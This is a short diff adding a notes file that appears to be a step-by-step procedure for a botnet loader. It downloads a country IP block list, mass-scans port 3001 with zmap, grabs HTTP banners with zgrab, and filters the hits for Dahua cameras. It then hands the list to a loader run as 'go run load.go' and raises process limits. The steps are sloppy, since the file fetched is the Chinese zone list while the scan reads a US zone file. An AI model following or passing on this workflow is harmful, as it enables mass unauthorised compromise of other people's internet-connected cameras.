@@ -1,0 +1,8 @@
+1. https://www.ipdeny.com/ipblocks/data/countries/cn.zone
+2  zmap -p3001 -w us.zone -o ips.txt
+3  ./zgrab or u can do ./zgrab http -f ips.txt -o ips.json -p 80
+4. rm -rf ips.txt
+5. cat ips.json | grep "dahua" | awk -F "{\"ip\":\"" '{print $2}' | awk -F "\",\"" '{print $1}' > ips.txt
+6. load, ex. go run load.go
+
+ulimit -n 999999 ulimit -u 999999
